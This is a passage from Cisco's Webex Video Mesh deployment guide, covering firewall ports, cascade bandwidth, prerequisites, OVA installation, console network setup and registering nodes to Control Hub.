Webex App continue to connect to Video Mesh nodes over shared ports 5004. These ports are also used by Webex App and Webex registered endpoints for STUN tests to Video Mesh nodes. Video Mesh node to Video Mesh node for cascades use destination port range of 10000–40000.\* TCP is also supported, but not preferred because it may affect media quality.

\*\* If you want to restrict by IP addresses, see the IP address ranges that are documented in [Network Requirements for Webex Services](https://collaborationhelp.cisco.com/article/WBX000028782).

For the best experience using Webex in your organization, configure your firewall to allow all outbound TCP and UDP traffic that is destined toward ports 5004 as well as any inbound replies to that traffic. The port requirements that are listed above assume that Video Mesh nodes are deployed either in the LAN (preferred) or in a DMZ and that Webex App are in the LAN.

### Video Quality and Scaling for Video Mesh

Below are some common meeting scenarios when a cascade is created. Video Mesh is adaptive depending on the available bandwidth and distributes resources accordingly. For devices in the meeting that use the Video Mesh node, the cascade link provides the benefit of reducing average bandwidth and improving the meeting experience for the user.

For bandwidth provisioning and capacity planning guidelines, see the [Preferred Architecture documentation](https://www.cisco.com/c/dam/en/us/td/docs/solutions/CVD/Collaboration/AltDesigns/BWM-Wbx.pdf).

Based on the active speakers in the meeting, the cascade links are established. Each cascade can contain up to 6 streams and the cascade is limited to 6 participants (6 in the direction of Webex app/SIP to Webex cloud and 5 in the opposite direction). Each media resource (cloud and Video Mesh) ask the remote side for the streams that are needed to fulfil the local endpoint requirements of all remote participants across the cascade.

![](https://cisco-api.ingeniuxondemand.com/DITA/content/en/us/td/i/400001-500000/430001-440000/434001-435000/434601.jpg)

To provide a flexible user experience, the Webex platform can do multistream video to meeting participants. This same ability applies to the cascade link between Video Mesh nodes and the cloud. In this architecture, the bandwidth requirements vary depending on a number of factors, such as the endpoint layouts.

#### Architecture

![](https://cisco-api.ingeniuxondemand.com/DITA/content/en/us/td/i/400001-500000/430001-440000/434001-435000/434598.jpg)

In this architecture, Cisco Webex-registered endpoints send signaling to the cloud and media to the switching services. On-premises SIP endpoints send signaling to the call control environment (Unified CM or Expressway), which then sends it to the Video Mesh node. Media is sent to the transcoding service.

#### Cloud and Premises Participants

Local on-premises participants on the Video Mesh node request the desired streams based on their layout requirements. Those streams are forwarded from the Video Mesh node to the endpoint for local device rendering.

Each cloud and Video Mesh node requests HD and SD resolutions from all participants that are cloud registered-devices or Webex app. Depending on the endpoint, it will send up to 4 resolutions, typically 1080p, 720p, 360p, and 180p.

#### Cascades

Most Cisco endpoints can send 3 or 4 streams from a single source in a range of resolutions (from 1080p to 180p). The layout of the endpoint dictates the requirement for the streams needed on the far end of the cascade. For active presence, the main video stream is 1080p or 720p, the video panes (PiPS) are 180p. For equal view, the resolution is 480p or 360p for all participants in most cases. The cascade created between Video Mesh nodes and the cloud also sends 720p, 360p and 180p in both directions. Content is sent as single stream, and audio is sent as multiple streams.

Cascade bandwidth graphs that provide a per-cluster measurement are available in the Analytics menu in Webex Control Hub. You cannot configure cascade bandwidth per meeting in Control Hub.

The maximum negotiated cascade bandwidth per meeting is 20Mbps for main video for all sources and the multiple main video streams that they could send. This maximum value does not include the content channel or audio.

#### Main Video With Multiple Layout Example

The following diagrams illustrate an example meeting scenario and how the bandwidth is influenced when multiple factors are at play. In the example, all Webex app and Webex-registered devices are transmitting 1x720p, 1x360p and 1x180p streams to Video Mesh. On the cascade, streams of 720p, 360p, and 180p are transmitted in both directions. The reason is because there are Webex app and Webex-registered devices that are receiving 720p, 360p and 180p on both sides of the cascade.

In the diagrams, the bandwidth numbers for transmitted and received data are for example purposes only. They are not an exhaustive coverage of all possible meetings and accompanying bandwidth requirements. Different meeting scenarios (joined participants, device capabilities, content sharing within the meeting, activity at any given point in time during the meeting) will yield different bandwidth levels.

The diagram below shows a meeting with cloud and premises registered endpoints and an active speaker.

***Main Video With Multiple Layout at Time of Meeting***

In the same meeting, the diagram below shows an example of a cascade created between the Video Mesh nodes and the cloud in both directions.

***Cascade From Video Mesh Node to Cloud***

In the same meeting, the diagram below shows an example of a cascade from the cloud.

***Cascade From the Cloud***

The diagram below shows a meeting with the same devices above, along with a Webex Meetings client. The system sends the active speaker and last active speaker in high definition, along with an extra HD stream of the active speaker for Webex Meeting clients because Video Mesh nodes do not support the Webex Meetings at this time.

***Addition of Webex Meetings Participant***

### Requirements for Webex Services

Work with your partner, customer success manager (CSM), or trials representative to correctly provision the Cisco Webex site and Webex services for Video Mesh:

1. You must have a Webex organization with a paid subscription to Webex services.
2. To take full advantage of Video Mesh, make sure your Webex site is on video platform version 2.0. (You can verify that your site is on video platform version 2.0 if it has the Media Resource Type list available in the Cloud Collaboration Meeting Room site options.)

   ![](https://cisco-api.ingeniuxondemand.com/DITA/content/en/us/td/i/400001-500000/420001-430000/427001-428000/427242.jpg)
3. You must enable CMR for your Webex site under user profiles. (You can do this in a bulk update CSV with the SupportCMR attribute).

For further information, see [Feature Comparison and Migration Path from Collaboration Meeting Room Hybrid to Video Mesh](#reference_6563B39FF92FD1089DB4D7FF360338AF) in the Appendix.

### Verify That the Source Country Is Correct

Video Mesh uses the globally distributed media (GDM) capabilities of Webex to achieve
better media routing. To achieve optimal connectivity, Webex selects the nearest
cloud media node to your enterprise when performing Video Mesh cascades to Webex.
Traffic then passes through the Webex backbone to interact with the Webex
microservices for the meeting. This routing minimizes latency and keeps most of the
traffic on the Webex backbone and off the internet.

To support GDM, we use MaxMind as the GeoIP location provider for this process.
Verify that MaxMind correctly identifies the location of your Public IP address to
ensure efficient routing.

| 1 | In a web browser, enter this URL with the public IP address of your Expressway or endpoint at the end.  ``` https://ds.ciscospark.com/v1/region/<public IP address> ```   You receive a response like the following:  ``` attribution: "This product includes GeoLite2 data created by MaxMind, available from http://www.maxmind.com" clientAddress: "<public IP address>" clientRegion: "US-WEST" countryCode: "US" disclaimer: "This service is intended for use by Webex Team only. Unauthorized use is prohibitted." regionCode: "US-WEST" timezone: "America/Chicago" ``` |
| --- | --- |
| 2 | Verify that the `countryCode` is appropriate for the location of your Expressway or endpoint. |
| 3 | If the location is incorrect, submit a request to correct the location of your public IP address to MaxMind at <https://support.maxmind.com/geoip-data-correction-request/correct-a-geoip-location>. |

### Complete the Prerequisites for Video Mesh

Use this checklist to ensure you are ready to install and configure Video Mesh nodes and integrate a Webex site with Video Mesh.

| 1 | Ensure that you:   * Meet the minimum system requirements that are described in [Requirements for Video Mesh](#reference_267223F468729132FF9E2C42CFA86550) and [License Requirements for Hybrid Services](https://collaborationhelp.cisco.com/article/uuhc6x). * Understand the call capacity examples that are described in [Capacity for Video Mesh nodes](#Cisco_Reference.dita_9c943675-d864-40aa-8f98-f5bb2f633012). * Understand the supported deployment models described in [Deployment Models Supported by Video Mesh](#reference_07D28788E61F18B0FDCA76C9B72CAA66). * Ensure that your network allows connectivity on the ports and using the protocols described in [Ports and Protocols Used by Video Mesh](#reference_931D7E96CA43B51A44E9A01B14BEB0F4) * Ensure that your network supports the bandwidth requirements described in [Video Quality and Scaling for Video Mesh](#reference_F1B437BE20FF0A9ABF165B2A2B4F1122) |
| --- | --- |
| 2 | Work with your partner, customer success manager, or trials representative to understand and prepare your Webex environment so that it's ready to connect to Video Mesh. For more information, see [Requirements for Webex Services](#reference_4613F10EB0B7DBE062D2C6F14E65337A). |
| 3 | Record the following network information to assign to your Video Mesh nodes:   * IP address (Recommended) * Network mask * Gateway IP address * DNS servers * NTP servers * A hostname and optionally domain name for the Video Mesh node. (Optional)  We recommend that you use IP addresses for Video Mesh. If you plan to configure the nodes with FQDN, the FQDN value should be resolvable using all the entries in the DNS servers list configured on the node. You must also create both forward- and reverse-DNS (A- and PTR-records) in the DNS configuration. |
| 4 | Before starting installation, make sure your Webex organization is enabled for Video Mesh. This service is available for organizations with certain paid Webex service subscriptions as documented in [License Requirements for Cisco Webex Hybrid Services](https://collaborationhelp.cisco.com/article/uuhc6x). Contact your Cisco partner or account manager for assistance. |
| 5 | Choose a supported hardware or specifications-based configuration for your Video Mesh node, as described in [System and Platform Requirements for Video Mesh Node Software](#reference_B79B943FA0BB4A4D520153DA34B27663). |
| 6 | Make sure your server is running VMware ESXi 7 or 8, and vSphere 7 or 8, with a VM host operational. |
| 7 | If you're integrating Video Mesh with your Unified CM call control environment and you want the participant lists to be consistent across meeting platforms, make sure your Unified CM cluster security mode is set to mixed mode so that it supports TLS-encrypted traffic. End-to-end encrypted traffic is required for this functionality to work.  See the TLS setup chapter in the [Security Guide for Cisco Unified Communications Manager](https://www.cisco.com/c/en/us/td/docs/voice_ip_comm/cucm/security/11_5_1_SU3/cucm_b_security-guide-1151su3/cucm_b_security-guide-1151su3_chapter_0101.html) for more information about switching your Unified CM environment to mixed mode. See the [Active Control solution guide](https://collaborationhelp.cisco.com/article/qbe7udb) for more information about the features and about how to set up end-to-end encryption. |
| 8 | If you're integrating a proxy (explicit, transparent inspecting, or transparent non-inspecting) with Video Mesh, make sure you following the requirements as documented in [Requirements for Proxy Support for Video Mesh](#id_71084). |

### Video Mesh Deployment Task Flow

Before you begin

[Prepare Your Environment](#topic_6B31D1DBAFD4D6C942AD12A3589E07A5)

| 1 | [Install and Configure Video Mesh Node Software](#CMGT_TK_IB92E823_00)  Use this procedure to deploy a Video Mesh Node to your host server running VMware ESXi or vCenter. You install the software on-premises which creates a node and then perform initial configuration, such as network settings. You'll register it to the cloud later. |
| --- | --- |
| 2 | [Log in to the Video Mesh Node Console](#CMGT_TK_S7ADF3D5_00)  Sign in to the console for the first time. The Video Mesh Node software has a default password. You need to change this value before you configure the node. |
| 3 | [Set the Network Configuration of the Video Mesh Node in the Console](#CMGT_TK_MFB8F435_00)  Use this procedure to configure the network settings for the Video Mesh Node if you didn't configure them when you set up the node on a virtual machine. You'll set a static IP address and change the FQDN/hostname and NTP servers. DHCP is not currently supported. |
| 4 | Use these steps to configure the external interface for a dual network interface (dual NIC) deployment:   * [Set The External Network Interface of the Video Mesh Node](#task_39B22FF596CE316D6055027BBA45108B) * [Add Internal and External Routing Rules](#id_84724)   After the node is back online and you verified the internal network configuration, you can configure the external network interface if you're deploying the Video Mesh Node in your network's DMZ so that you can isolate the enterprise (internal) traffic from the outside (external) traffic.  You can also make exceptions or overrides to the default routing rules. |
| 5 | [Register the Video Mesh Node to the Webex Cloud](#task_6C0A252BBD3227BE5D90701D701671A3)  Use this procedure to register Video Mesh nodes to the Webex cloud and complete additional configuration. When you use Control Hub to register your node, you create a cluster to which the node is assigned. A cluster contains one or more media nodes that serve users in a specific geographic region. The registration steps also configure SIP call settings, set an upgrade schedule, and subscribe to email notifications. |
| 6 | Enable and verify Quality of Service (QoS) with the following tasks:   * [Enable Quality of Service (QoS) for Video Mesh Node](#id_83839) * [Verify Video Mesh Node Port Ranges With Reflector Tool in the Web Interface](#id_84226)   Enable QoS if you want Video Mesh nodes to automatically mark SIP traffic (on-premises SIP registered endpoints) for both audio (EF) and video (AF41) separately with appropriate class of service and use well-known port ranges for specific media types. This change will let you create QoS policies and effectively remark return traffic from the cloud if desired.  Use the Reflector Tool steps to verify the correct ports are opened on your firewall. |
| 7 | [Configure Video Mesh Node for Proxy Integration](#task_EA0A06C26910D9AFA85F888F201F0B44)  Use this procedure to specify the type of proxy that you want to integrate with a Video Mesh. If you choose a transparent inspecting proxy, you can use the node's interface to upload and install the root certificate, check the proxy, and troubleshoot any potential issues. |
| 8 | Follow [Integrate Video Mesh With Call Control Task Flow](#id_90854) and choose one of the following, depending on your call control, security requirements, and whether you want to integrate Video Mesh with your call control environment:   * [Configure Unified CM Secure TLS SIP Traffic Routing for Video Mesh](#id_82592) (TLS) * [Configure Unified CM TCP SIP Traffic Routing for Video Mesh](#task_85522F2379FF6750950746778176C2C1) (TCP) * [Configure Expressway TCP SIP Traffic Routing for Video Mesh](#task_931CA6F2A3A3B7D7E68A7B298FA05352) (TCP)   SIP devices don't support direct reachability, so you must use Unified CM or VCS Expressway configuration to establish a relationship between on-premises registered SIP devices and your Video Meshclusters.  You only need to trunk your Unified CM or VCS Expressway to Video Mesh Node, depending on your call control environment. |
| 9 | [Exchange Certificate Chains Between Unified CM and Video Mesh Nodes](#id_82611)  In this task, you download certificates from the Unified CM and Video Mesh interfaces and upload one to the other. This step establishes secure trust between the two products and, in conjunction with the secure trunk configuration, allows encrypted SIP traffic and SRTP media in your organization to land on Video Mesh nodes. |
| 10 | [Enable Media Encryption for the Organization and Video Mesh Clusters](#id_91009)  Use this procedure to turn on media encryption for your organization and individual Video Mesh clusters. This setting forces end-to-end TLS setup and you must have a secure TLS SIP trunk in place on your Unified CM that points to your Video Mesh nodes. |
| 11 | [Enable Video Mesh for the Webex Site](#task_E162DB738FE0CDBB56883D54ACF6EE73)  To use optimized media to the Video Mesh Node for a Webex meeting to all the Webex app and devices to join, this configuration needs to be enabled for the Webex site. Enabling this setting links Video Mesh and meeting instances in the cloud together and allows cascades to occur from Video Mesh nodes. If this setting is not enabled, the Webex app and devices will not use the Video Mesh node for Webex meetings. |
| 12 | [Assign Collaboration Meeting Rooms to Webex App Users](#task_820C5190BA26F765F07BFD8349BCE325) |
| 13 | [Verify the meeting experience on the secure endpoint](#id_96178)  If you are using media encryption through the end-to-end TLS setup, use these steps to verify that the endpoints are securely registered and the correct meeting experience appears. |

### Bulk Provisioning Script for Video Mesh

If you need to deploy many nodes in your Video Mesh deployment, the process is time-consuming. You can use the script at <https://github.com/CiscoDevNet/webex-video-mesh-node-provisioning> to deploy Video mesh nodes on VMWare ESXi servers quickly. Read through the readme file for instructions on using the script.

### Install and Configure Video Mesh Node Software

Use this procedure to deploy a Video Mesh Node to your host server running VMware ESXi or vCenter. You install the software on-premises which creates a node and then perform initial configuration, such as network settings. You'll register it to the cloud later.

You must download the software package (OVA) from Control Hub ( <https://admin.webex.com>), rather than using a previously downloaded version. This OVA is signed by Cisco certificates and can be downloaded after you sign in to Control Hub with your customer administrator credentials.

Before you begin

* See [System and Platform Requirements for Video Mesh Node Software](#reference_B79B943FA0BB4A4D520153DA34B27663) for supported hardware platforms and specifications requirements for the Video Mesh Node.
* Make sure you have these required items:

  + A computer with:

    - VMware vSphere client 7 or 8.

      For a list of supported operating systems, refer to VMware documentation.
    - Video Mesh software OVA file downloaded.

      Download the latest Video Mesh software from Control Hub, rather than using a previously downloaded version. You can also access the software from [this link](https://binaries.webex.com/mediaFusionManagementConnector/videomesh.ova). (The file is approximately 1.5 GB.)

      Older versions of the software package (OVA) will not be compatible with the latest Video Mesh upgrades. This can result in issues while upgrading the application. Make sure you download the latest version of the OVA file from [this link](https://binaries.webex.com/mediaFusionManagementConnector/videomesh.ova).
  + A supported server with VMware ESXi or vCenter 7 or 8 installed and running
  + Disable virtual machine backups and live migration. Video Mesh Node clusters are realtime systems; any virtual machine pauses can make these systems unstable. (For maintenance activities on a Video Mesh Node, use [maintenance mode](https://collaborationhelp.cisco.com/article/nxep7tb) from Control Hub.)

| 1 | Using your computer, open the VMware vSphere client and sign in to the vCenter or ESXi system on the server. |
| --- | --- |
| 2 | Go to **Actions > Deploy OVF Template**. |
| 3 | On the **Select an OVF tempate** page, click **Local File**, then Choose Files. Navigate to where the **videomesh.ova** file is located, choose the file, and then click Next.   Each time you do a Video Mesh Node installation, we recommend that you redownload the OVA rather than using a previously downloaded version. If you try to deploy an old OVA, your Video Mesh Node may not work properly nor register to the cloud. An old OVA will also lead to potential issues during upgrades.  Make sure you download a new copy of the OVA from [this link](https://binaries.webex.com/mediaFusionManagementConnector/videomesh.ova). |
| 4 | On the **Select a name and folder** page, enter a **Virtual machine name** for the Video Mesh Node (for example, "Video\_Mesh\_Node\_1"), choose a location where the virtual machine node deployment can reside, and then click **Next**.  A validation check runs. After it finishes, the template details appear. |
| 5 | Verify the template details and then click Next. |
| 6 | On the **Configuration** page, choose the type of deployment configuration, and then click **Next**.   * VMNLite (default) * CMS 1000   The options are listed in the order of increasing resource requirements.  If you choose the VMNLite option, you'll need to repeat the steps to deploy the other instance(s) on the same host, and choose the same option each time. Co-residency of VMNLite and non-VMNLite instances has not been tested and is not supported. |
| 7 | On the **Select storage** page, ensure that the default disk format of Thick Provision Lazy Zeroed and VM storage policy of Datastore Default are selected and then click **Next**. |
| 8 | On the **Select networks** page, choose the network option from the list of entries to provide the desired connectivity to the VM.   * For **Internal Interface Network**, choose the node's internal IP address. * For **External InterfaceNetwork**, choose the external IP address that faces the public network. Ignore this option if you don't have a dual NIC deployment.   The inside interface (the default interface for traffic) is used for CLI, SIP trunks, SIP traffic and node management. The outside (external) interface is for HTTPS and websockets communication to the Webex cloud, along with the cascades traffic from the nodes to a meeting.  For a DMZ deployment, you can set up the Video Mesh node with the dual network interface (NIC). This deployment lets you separate the internal enterprise network traffic (used for interbox communication, cascades between node clusters, and to access the node's management interface) from the external cloud network traffic (used for connectivity to the outside world and cascades to Webex). All nodes in a cluster must be in dual NIC mode; a mixture of single and dual NIC is not supported.  For an existing installation of Video Mesh Node software, you cannot upgrade from a single NIC to a dual NIC configuration. You must do a fresh install of Video Mesh Node in this case. |
| 9 | On the Customize template page, configure the following network settings:   * **Hostname** (Optional)—Enter the FQDN (hostname and domain) or a single word hostname for the node.   + To ensure a successful registration to the cloud, use only lowercase characters in the FQDN or hostname that you set for the Video Mesh Node. Capitalization is not supported at this time.   + When using or configuring FQDN or hostname, you must also enter a valid and resolvable domain. The total length of the FQDN must not exceed 64 characters. * **IP Address**— Enter the IP address for the internal interface of the node. * **Mask**—Enter the subnet mask address in dot-decimal notation. For example, *255.255.255.0*. * **Gateway**—Enter the gateway IP address. A gateway is a network node that serves as an access point to another network. * **DNS Servers**—Enter a comma-separated list of DNS servers, which handle translating domain names to numeric IP addresses. (Up to 4 DNS entries are allowed.) * **NTP Servers**—Enter your organization's NTP server or another external NTP server that can be used in your organization. You can also use a comma-separated list to enter multiple NTP servers.  * The Video Mesh Node must have an internal IP address and resolvable DNS name. The node IP address must not belong to the IP address range reserved for Video Mesh Node internal use. The default reserved IP address range is 172.17.42.0–172.17.42.63, which can be configured later in the **Diagnostic** menu. This IP address range is for communication within the Video Mesh Node and between the software containers which hold the different components of the node—for example, SIP interface and media transcoding. * Deploy all the nodes on the same subnet or VLAN, so that all nodes in a cluster are reachable from wherever the clients reside in your network. * For a dual NIC DMZ deployment, you can set the external IP address in the node console, after you've saved the internal network configuration and rebooted the node later.   If preferred, you can skip the network setting configuration and follow the steps in [Set the Network Configuration of the Video Mesh Node in the Console](#CMGT_TK_MFB8F435_00) after you sign into the node. |
| 10 | On the **Ready to Complete** page, verify that all the settings that you entered match the guidelines in this procedure, and then click **Finish**.  After deployment of the OVA is complete, your Video Mesh Node appears in the list of VMs. |
| 11 | Right-click the Video Mesh Node VM, and then choose **Power > Power On**.  The Video Mesh Node software is installed as a guest on the VM Host. You are now ready to sign in to the console and configure the Video Mesh Node.  You may experience a delay of a few minutes before the node containers come up. A bridge firewall message appears on the console during first boot, during which you can't sign in. |

What to do next

[Log in to the Video Mesh Node Console](#CMGT_TK_S7ADF3D5_00)

### Log in to the Video Mesh Node Console

Sign in to the console for the first time. The Video Mesh Node software has a default password. You need to change this value before you configure the node.

| 1 | From the VMware vSphere client, go to the Video Mesh Node VM, and then choose Console.  The Video Mesh Node VM boots up and a login prompt appears. If the login prompt does not appear, press Enter. You may briefly see a message that indicates the system is being initialized. |
| --- | --- |
| 2 | Use the following default username and password to log in:   1. Login: **`admin`** 2. Password: **`cisco`**   Because you are logging in to the Video Mesh Node for the first time, you must change the administrator passphrase (password). |
| 3 | For (current) password, enter the default password (from above), and then press Enter. |
| 4 | For new password, enter a new passphrase, and then press Enter. |
| 5 | For retype new password, retype the new passphrase, and then press Enter.  A "Password successfully changed" message appears, and then the initial Video Mesh Node screen appears with a message about unauthorized access being prohibited. |
| 6 | Press Enter to load the main menu. |

What to do next

[Set the Network Configuration of the Video Mesh Node in the Console](#CMGT_TK_MFB8F435_00)

### Set the Network Configuration of the Video Mesh Node in the Console

Use this procedure to configure the network settings for the Video Mesh Node if you didn't configure them when you set up the node on a virtual machine. You'll set a static IP address and change the FQDN/hostname and NTP servers. DHCP is not currently supported.

These steps are required if you didn't configure network settings at the time of OVA deployment.

The inside interface (the default interface for traffic) is used for CLI, SIP trunks, SIP traffic and node management. The outside (external) interface is for HTTPS and websockets communication to Webex, along with the cascades traffic from the nodes to Webex.

| 1 | Open the node console interface through the VMware vSphere client and then sign in using the admin credentials.  After first time setup of the network settings and if the Video Mesh is reachable, you can access the node interface through secure shell (SSH). |
| --- | --- |
| 2 | From the main menu of the Video Mesh Node console, choose option **2 Edit Configuration** and then click **Select**. |
| 3 | Read the prompt that the calls will end on the Video Mesh Node, and then click **Yes**. |
| 4 | Click Static, enter the IP address for the internal interface, Mask, Gateway, and **DNS** values for your network.   * The Video Mesh Node must have an internal IP address and resolvable DNS name. The node IP address must not belong to the IP address range reserved for Video Mesh Node internal use. The default reserved IP address range is 172.17.42.0–172.17.42.63, which can be configured in the **Diagnostic** menu. This IP address range is for communication within the Video Mesh Node and between the software containers which hold the different components of the node—for example, SIP interface and media transcoding. * Deploy all the nodes on the same subnet or VLAN, so that all nodes in a cluster are reachable from wherever the clients reside in your network. * For a dual NIC DMZ deployment, you can set the external IP address in the next procedure, after you've saved the internal network configuration and rebooted the node. |
| 5 | Enter your organization's NTP server or another external NTP server that can be used in your organization.  After you configure the NTP server and save network settings, you can follow the steps in [Check Health of Video Mesh Node From Console](#task_F3BFA4778B287661D1FD62CCA646C70B) to verify that the time is synchronizing correctly through the specified NTP servers.  If you configure more than one NTP servers, the poll interval for failover is 40 seconds. |
| 6 | (Optional) Change the hostname or domain, if required.   * To ensure a successful registration to the cloud, use only lowercase characters in the hostname that you set for the Video Mesh Node. Capitalization is not supported at this time. * When using or configuring FQDN or hostname, you must also enter a valid and resolvable domain. The total length of the FQDN must not exceed 64 characters. |
| 7 | Click **Save**, and then click **Save Changes & Reboot**.  During the save, DNS validation is performed if you provided a domain. A warning is displayed if the FQDN (hostname and domain) is not resolvable using the DNS server addresses provided. You may choose to save by ignoring the Warning, but calls will not work until the FQDN can resolve to the DNS configured on the node. After the Video Mesh Node reboots, the network configuration changes take effect. |

What to do next

Once the software image is installed and configured with the network settings (IP Address, DNS, NTP, and so on) and accessible on the enterprise network, you can move to the next step of securely registering it to the cloud. The IP address that is configured on the Video Mesh Node is accessible only from the enterprise network. From a security perspective, the node is hardened whereby only customer administrators can access the node interface to perform configuration.

[Set The External Network Interface of the Video Mesh Node](#task_39B22FF596CE316D6055027BBA45108B)

### Set The External Network Interface of the Video Mesh Node

After the node is back online and you verified the internal network configuration, you can configure the external network interface if you're deploying the Video Mesh Node in your network's DMZ so that you can isolate the enterprise (internal) traffic from the outside (external) traffic.

| 1 | From the main menu of the Video Mesh Node console, choose option **5 External IP Configuration** and then click **Select**. |
| --- | --- |
| 2 | Click 1 Enable/Disable, then Select, and then Yes  to enable the external IP address options on the node. |
| 3 | As you did with the initial network configuration, enter the IP Address (external), Mask, and Gateway values.   The Interface field shows the name of the external interface for the node. |
| 4 | Click Save and Restart.  The node once again reboots to enable the dual IP address, and then automatically configures the basic static routing rules. These rules determine that traffic to and from a private class IP address uses an internal interface; traffic to and from a public class IP address uses an external interface. Later, you can create your own routing rules—For example, if you need to configure an override and allow access to an external domain from the internal interface.  Under certain circumstances, the existing SSH connection may terminate. For organizations that use IP addresses from the [public range](http://www.vlsm-calc.net/ipclasses.php), you must reestablish an SSH connection to the public IP address of the Video Mesh Node. |
| 5 | To validate the internal and external IP address configuration, from the main menu of the console, go to **4 Diagnostics**, and then choose **Ping**. |
| 6 | In the **ping** field, enter a destination address that you want to test, such as an external destination or an internal IP address, and then click **OK**.   * Test an external destination (example, cisco.com); if successful, the results show that the destination was accessed from the external interface. * Test an internal IP address; if successful, the results show that the address was accessed from the internal interface. |

### Add Internal and External Routing Rules

In a dual network interface (NIC) deployment, you can fine tune the routing for Video Mesh nodes by adding user-defined route rules for external and internal interfaces. The default routes are added to the nodes, but you can make exceptions—for example, external subnets or host addresses that need to be accessed through the internal interface, or internal subnets or host addresses that need to be accessed from the external interface. Perform the following steps as needed.

| 1 | From the Video Mesh node interface, choose 5 External IP Configuration and then click Select. |
| --- | --- |
| 2 | Choose 3 Manage Routing Rules, and then click Select.  The first time you open this page, the default system routing rules appear in the list. By default, all internal traffic goes through the internal interface and external traffic through the external interface.    You can add manual overrides to these rules in the next steps. |
| 3 | Follow these steps as needed:   * Click Add external route, and then enter the internal subnet or host IP address to use for the external route. * Click Add internal route, and then enter the external subnet or host IP address to use for the internal route.   As you add each rule, they appear in the routing rule list, categorized as user defined rules.  The default routes cannot be deleted, but you can delete any user-defined overrides that you configured. |

Custom routing rules may create potential for conflicts with other routing. For example, you may define a rule that freezes your SSH connection to the Video Mesh Node interface. If this happens, do one of the following and then remove or modify the routing rule:

* Open an SSH connection to the public IP address of the Video Mesh Node.
* Access the Video Mesh Node through the ESXi console

### Register the Video Mesh Node to the Webex Cloud

Use this procedure to register Video Mesh nodes to the Webex cloud and complete additional configuration. When you use Control Hub to register your node, you create a cluster to which the node is assigned. A cluster contains one or more media nodes that serve users in a specific geographic region. The registration steps also configure SIP call settings, set an upgrade schedule, and subscribe to email notifications.

Before you begin

* Once you begin registration of a node, you must complete it within 60 minutes or you have to start over.
* Ensure that any popup blockers in your browser are disabled or that you allow an exception for <https://admin.webex.com>.
* For best results, deploy all nodes of a cluster in the same data center. See [Clusters in Video Mesh](#concept_A0BB7278B2397794FA4C3F9CB2076DFE) for how they work and best practices.
* From the host or machine where you're registering Video Mesh Nodes to the cloud, you must have connectivity to the Webex cloud and the Video Mesh IP addresses that are being registered (in a dual NIC environment, specifically the internal IP addresses of the Video Mesh Nodes).

| 1 | Sign in to [Control Hub](https://admin.webex.com/).  You sign in to Control Hub using the admin credentials. The Control Hub admin functionality is available only to users who are defined as admins in Control Hub. See [Customer Account Roles](https://collaborationhelp.cisco.com/article/fs78p5) for more information. |
| --- | --- |
| 2 | Go to Services > Hybrid and choose one:   * Set up: Choose this option if this is the first Video Mesh Node you're registering, then click Next. See [Complete the Prerequisites for Video Mesh](#CMGT_TK_PC5540D5_00) for more information. * View all: Choose this option if you've already registered one or more Video Mesh Nodes, then click Add Resource. |
| 3 | Make sure you have installed and configured your Video Mesh Node. Click Yes, I'm ready to register..., then click Next. |
| 4 | In Create a new or select a cluster, choose one:   * For a new cluster, enter a name for the cluster to which you want to assign your Video Mesh Node. * For an existing cluster, click the field, then choose an existing cluster to which to add the new node.   We recommend that you name a cluster based on where the nodes of the cluster are located geographically. For example, "San Francisco". |
| 5 | In Enter the FQDN or IP address, enter the fully qualified domain name (FQDN) or internal IP address of your Video Mesh Node and then click Next.   * If you use FQDN, enter a domain that can be resolved by DNS. * If you use an IP address, enter the same internal IP address that you used to configure the node from the console.   An FQDN must resolve directly to the IP address or it is not usable. We perform the validation on FQDN to rule out any typo or configuration mismatch.  The dual network interface does not support specifying an FQDN for the external IP address. The FQDN can be added only on the screen where internal IP address is entered. That is what the FQDN must resolve to using the DNS servers that are specified on the same screen. |
| 6 | Under Upgrade Schedule, choose a time, frequency, and time zone.  The default is a daily upgrade schedule. You can change it to a weekly schedule on a specific day. When an upgrade is available, the Video Mesh Node software automatically upgrades during the time that you select.  When an upgrade is available, you can use Upgrade Now to start the upgrade before the next maintenance window or Postpone to defer it until the subsequent window. |
| 7 | Under Email Notifications, add administrator email addresses to subscribe to notifications about service alarms and software upgrades.  Your administrator email address is automatically added. You can remove it if you want. |
| 8 | Toggle the Video Quality setting on to enable 1080p 30fps video.  With this setting, SIP participants that join a meeting that is hosted in a Video Mesh Node can use 1080p 30fps video if they are all inside the corporate network and they're using a high definition-capable device. The setting applies to all clusters of nodes.   * If this setting is off, the default is 720p. * For video resolutions supported by Webex App, see [Video specifications for calls and meetings](https://collaborationhelp.cisco.com/article/nckc1aeb). |
| 9 | Read the information under *Complete Registration*, then click Go to Node to register the node to the Webex cloud.  A new browser tab opens to check the node. This step safelists the Video Mesh Node using the IP address of the node. During the registration process, Control Hub redirects you to the Video Mesh Node. The IP address must be safelisted, otherwise registration fails. The registration process must be completed from the enterprise network where the node is installed. |
| 10 | Check Allow Access to the Webex Video Mesh Node, then click Continue. |
| 11 | Click Allow.  Your account is validated, your Video Mesh Node is registered and the message Registration Complete is shown, indicating your Video Mesh Node is now registered to Webex.  The Video Mesh Node gets machine credentials based on your organization's entitlements. The generated machine credentials expire periodically and are refreshed. |
| 12 | Click the portal link or close the tab to go back to the Video Mesh page.  On the Video Mesh page, you now see the new cluster that contains the Video Mesh Node that you registered.   * If you go to the cluster, you'll see the new Video Mesh Node, which initially shows a status of Registering. The node changes to Running when it is ready for use in your Webex organization. * Because the software is a container that contains services from the cloud infrastructure, it gets updates from the cloud to remain in sync with the cloud services. Required updates may install shortly after you register the node to the cloud. You can also change your automatic upgrade schedule. See [Automatic Upgrades for Hybrid Services Resources](https://collaborationhelp.cisco.com/article/nhhoxf6) for more information. * If you installed the demo image on the node that you registered, you'll see a demo mode yellow status alarm. This alarm is normal, but we recommend installing the full software image before the 90-day grace period expires for the demo image.   At this point, the Video Mesh Node is ready to communicate with Cisco cloud services over the secured channels using a token issued for authentication. The Video Mesh Node also communicates with Docker Hub (docker.com, docker.io). Docker is used by Video Mesh node to store containers for distribution to different Video Mesh nodes all over the world. Only Cisco has credentials to write to Docker Hub. The Video Mesh nodes can reach out to Docker Hub using read-only credentials to download the containers for upgrades.  Images are downloaded based on checksum, which is transmitted to the node as part of the provisioning data. See this document for more details on how docker pull works: <https://docs.docker.com/v17.09/engine/userguide/storagedriver/imagesandcontainers/#sharing-promotes-smaller-images> |

**Things to keep in mind**

Keep the following information in mind about Video Mesh Node and how it works once registered to your Webex organization:

